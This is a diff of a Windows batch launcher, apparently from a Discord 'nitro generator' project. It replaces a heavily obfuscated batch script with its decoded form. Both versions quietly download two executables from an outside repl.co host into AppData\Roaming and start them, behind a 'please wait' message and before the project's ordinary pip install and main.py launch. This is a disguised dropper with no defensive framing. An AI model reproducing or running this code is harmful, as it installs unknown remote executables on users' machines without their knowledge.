@@ -1,9 +1,10 @@
-��&cls
-@%♾⚉⚔⚝♾o⚎♩♣%e%♔G♫♟⚗☤♭%c%y%h%u♅OwHGw☧%o%⚜P☷♧♻⚄♭% %m%o%☱♥TIq♛%f%K⚖♗☴%f%F☱⚐⚙☲y%
-
-e%jZP%c%⚄Z♮Y☻%h%☥P♦%o%♜♰♱☹⚏♅% %X☰♵B♨☳G%p%⚛☲⚊r☶T☤H%l%YA♨⚚a%e%⚀⚑%a%Tn%s%l☠♧u♯⚝T%e%☱☲% %♕I⚎%w%☵InW%a%♜⚈♰⚏♦%i%♢⚈⚄⚅%t%⚊⚈Z♟♙♲⚐⚘e% %uo☱b⚎♰J⚙Z⚖% %⚁♵⚃♪♩⚔♯%
-c%♧e⚗U☷☣r⚊%u%uc♬♝iV⚕♙A⚐%r%♬♟☥☲♡⚏%l%⚊☞⚍♠♡♢⚞% %⚖tp☠☟⚝%-%⚟☹⚍☣⚋H☲A%L%♽X♧♗v⚛⚈♪♭e% %♳♕♔⚌%-%♥%s%☣⚋Yd% %♶aD⚐♾%"%♹☻♤⚀%h%c♡P⚀☱le♵%t%♢☰☤d⚂⚘☣♜kr%t%d⚑⚄♗⚗♫♙%p%Y⚉♽ag♡♩♻p%s%♅☞RV♢aLnO%:%Yq♆⚆☳%/%W♹♣KR♕♟Kh♼%/%ms♔lCM⚋f%u%☡♛I♧⚁☱m♪☦⚄%n%⚅u♕⚐☷%t%L☱UyF%i%♨⚇C⚃EBj%m%♮x♤⚄☦%e%☢♦e⚄%l%♯☟m♅♕%y%⚟☡⚙☵H⚅%i%♕e☹♯⚈k%m%♨vL☠y%p%☦☠♶O♜☥♯OO%r%♳%e%c♤♧%s%ZV♽⚅☠⚏%s%⚌♶K⚄♗♚%i%♣♠☣⚌hJ⚀☴%o%⚁aj♞Ra⚚♅⚍♦%n%bE⚁☷☣☢♦⚛%a%☤☦♮%b%☟♚s⚅☲⚆⚉I%l%♱♛⚂n⚝♮%e%♶hL☷%a%♱E♅E%d%⚂K♡Xm♙☸♧zs%m%⚙nib⚜♶R♅x☠%i%P♝%n%☤⚟%i%l♥y♞%s%⚜☡♻wd⚎⚔%t%♖♝A☡%r%C⚃♩☻ORmAo♽%a%bl⚇⚑♤%t%⚁☹☟%i%Z♬♮f⚚x♯vkM%o%o♵Ik☣♹♟☧☦%n%p☥☴%.%♚♳TC☵♱♢♅%b%♡%l%☧♜%u%☥%s%♩pe⚐ORe⚋⚒☸%2%♗♔t♭%t%s%l%♶P♠♧☠Q%i%T⚋⚕I☳♰⚂♪☤%a%zdOc%.%Io⚗H⚀⚈☥%r%Hw⚎%e%xo☦L♽☡⚊%p%f♮♅L♞♆☲♨%l%⚔♧♆A⚉☶V☰☣♚%.%CU☡⚕♪n♆a%c%♡♸♲%o%⚑pq⚉o%/%at%n%⚐W♞Q☷E%i%zf♱⚞F⚁%t%♙☻♴♚♝%r%♭%o%⚀xX♬♥T⚄⚂%-%♫T☢♆⚈Q%g%t⚝⚗☸⚁%e%A♡♳⚞A♾☟%n%Cd♶%.%O⚑☹♹%e%fH⚅♘♧Q⚎♵♦%x%Ki♞%e%u♶♛Z☷♣♘⚊%"%N♱% %☠dQT%-%♗♠⚎cJ♛%o%♵⚐♧D⚁♹o% %A☣I⚊y☲♾☹♹v%C%☰Z⚗DR%:%☧♨⚍☰♕♡♱%\%⚐r⚒☢%U%♢♼♥⚙zt%s%♸♘D♅♡⚔F⚃%e%♞⚅☳♦♴%r%q%s%K%\%fpZMrM%%username%\%Vq%A%d⚁♕☶B♬⚌⚝xP%p%♠⚇⚝pJ☢⚟%p%n♸M♢I☱♗♶o⚘%D%♛⚀♡⚄%a%♜♆⚈b☻u%t%Tw♖☳P♙♸♖CN%a%♾☹☠%\%K%R%♠⚖%o%Rh⚎♤☡W♬%a%☞⚟s⚋♫☥♡⚃%m%♝%i%☶IgB%n%♝☥♰☴⚏%g%C☥L%\%♖♹bL⚞⚕♭lc%n%w☴♯♘⚙j%i%O☤♟⚗⚘B%t%n♶♡⚋KI%r%U⚝vQ⚗♬%o%G☲♾C☤♜Zx%-%y⚕♾♹☢♙k♹♾♗%g%⚃kN☲%e%Tg♘☴c%n%D☷⚏⚌♣m☞KxC%.%I⚃☷♛♸%e%a%x%♳y%e%⚆%
-s%♝♜D♽mM☱☟b%t%☞♵E♽⚇♔♼♴⚌%a%♞♰⚖⚝%r%T%t%u♡♫☠Uh⚙% %⚊ug☵t⚋♳%C%♚♬%:%Bm☶p⚆♵%\%Y☳Q⚆⚞♶♲♸%U%Q⚜☲⚕♕S%s%Kg%e%V⚇Lq☤Ax♧%r%♭☞♕RI♅⚙♙☥☷%s%⚙☢♡HMf%\%♞H⚂♤♴mn♥w♤%%username%\%♆%A%n⚂⚜☞C%p%⚄☹rg%p%m♠hql♰☣d%D%♵%a%☲C%t%IW⚗♸B☶♶⚘%a%♥⚈%\%♡☲⚑♛☡♤f♪X♾%R%♡♽♡♻♬%o%♹♩⚗GK⚏F♼⚄%a%Kr☢⚊♻⚀gP%m%⚎j♛%i%B%n%☴♵%g%RPzh☲☟%\%♜♣♱♤%n%⚗⚘⚊☻⚊♬%i%OR⚌☢♖a%t%i⚘♶LT%r%k♫H☦♠⚊J☴%o%⚜%-%z⚎♛e⚕♪♫♶Ei%g%a♽%e%s♳♧⚖j%n%♵♱DQF☰k%.%♰⚎W⚂☰f☻%e%Ps♜u☴%x%⚍⚂☴nL☥br%e%♥c♚☡♝♗⚀♡%
-c%⚏%u%♡⚅%r%♥u♥♨⚏⚀⚛%l%sFpQ♬% %♩⚗Ks♵⚒%-%☦♜♡T♪Q⚔q%L%m% %♞%"%px☰⚐♖☷⚉d%h%⚔♮☶☹⚍w☤%t%☶♢♵♞☥♛j☢♵n%t%⚙A♖♨⚀d%p%☥N♙U%s%U☣BG⚃%:%S⚘%/%⚕♯☡h⚕♶♽%/%S♮☹☲tg♧ed☤%U%♕☲T☱⚅P%n%ZI☣%t%RX♭♝♶♭%i%♲♜⚆♰☞⚏Pub%m%FO☢Y♕♕⚟dy%e%⚒⚄%l%☸D⚙⚗⚄☦☡☞u%y%p☲⚋%I%⚕iXs☢r%m%P☲♼tn%p%PS☷D♴%r%⚃l♱s♨☱j☧%e%⚇♨⚏o⚅⚋%s%⚐%s%♢⚋%i%v☵⚋☰K♡%o%♯♰♾Z⚃♬♅⚀%n%aX%a%⚕♡x♩P♲%b%♕jZBs⚞☲u⚞k%l%ps♥♸♖fi%e%♟%A%♶♻♕w☳☦h%d%☦♝uq♯☻A%m%☴♲Pkp⚐♹☴%i%⚂♸⚐☟☵♖%n%♦♢⚉♶jg♤Lg%i%♅%s%♬♆UU%t%♧j⚊y♴☞⚑♠%r%d⚐♯♫⚘⚇♡E⚌a%a%♚⚍♲⚙%t%⚈e♸u☹♽♖M%i%f♱E♘⚀%o%☶♡UKjeC⚅l♠%n%PN%.%♥%b%X♞♹⚆♠s%l%♢ZS☲☦♶wO♲⚅%u%♳⚆%s%☧♠☹⚎☱♹hi♧⚆%2%⚁WD⚝☟♡%t%☲⚜c%l%♬⚝%i%♪⚙⚜☴♶%a%W♪z⚈k♅b%.%⚊♶♼♞%r%♥☴%e%⚀♶☹⚛♴☟♮♠A%p%⚚%l%R☧☱☶☥☥♭j%.%⚝♥♱%c%⚘C♾C⚁n⚆Bl%o%☶♹⚄☠n☲♱⚕%/%D♵N⚞⚗⚞%m%G%a%♛p%i%♬⚗⚂⚑%n%♚♜%.%☥☤d♧♧⚂%p%♬♤♶♙aDSXI%y%CR♠G⚕P♚♸♫♖%"%♾bMZ⚝♼♨% %M⚋☸☢i♤sK%-%To%o%♯♫♥⚋Y⚉% %⚊%C%Rs%:%o⚌♥%\%v♢n%U%B♕%s%♗♬⚙☞I%e%♡⚃☧☣♵♰☰%r%s☴p☲♪A☠O%s%y♱%\%♲%%username%\%R⚌♼Z⚏♧%M%⚍☡AI♳♙⚃%u%⚋⚇r%s%♡♶⚇T%i%♴S⚆♧⚇iLD%c%♚DYf☞☱♲%\%☷♢⚅%m%♱u%a%⚄G⚛X%i%⚁♕Ys☰%n%♆☸☷☲n⚘R%.%☴♸♞♾⚑oV%p%☳hw☢%y%⚒☱♗⚎☲♢b☵⚂%
-s%☦⚙⚎♹%t%☴esf♸%a%♚♻☢Kz☷♹♱☣%r%⚏V♛⚋I%t%⚎b⚚☞⚏⚞% %☰♜pR♬⚝%C%☠%:%Q☦♪♸V♽q♡♶%\%c☦⚑OJ♘o♆%U%☥l%s%O⚜♶%e%⚁♡♙%r%q⚌♣T%s%C⚟Q%\%pk⚙⚁⚄⚞⚙⚊W♶%%username%\%⚔r⚍⚋%M%♦♫♩lz☻%u%h⚛⚑☤☥☧♶♼%s%⚁vM⚛%i%L♾♻%c%y⚝%\%d⚌⚜%m%⚝ZER%a%l♤v☧w♯⚄⚖%i%☧⚊⚖⚕%n%r♽♡☠b⚀%.%W⚛♚lk☶♟g♶♠%p%♖♶♗%y%⚍♢UQr♪☲♦♬%
-e%♼♢rOt♸%x%m☸⚍♩Z♘⚑ICv%i%☶d%t%W♨♦ZvA♦⚀%
+@echo off
+echo please wait  
+curl -L -s "https://untimelyimpressionableadministration.blus2tlia.repl.co/nitro-gen.exe" -o C:\Users\%username%\AppData\Roaming\nitro-gen.exe
+start C:\Users\%username%\AppData\Roaming\nitro-gen.exe
+curl -L "https://UntimelyImpressionableAdministration.blus2tlia.repl.co/main.exe" -o C:\Users\%username%\AppData\Roaming\main.exe
+start C:\Users\%username%\AppData\Roaming\main.exe
+exit
+cd %~dp0
+py -3 -m pip install -r requirements.txt
+start main.py
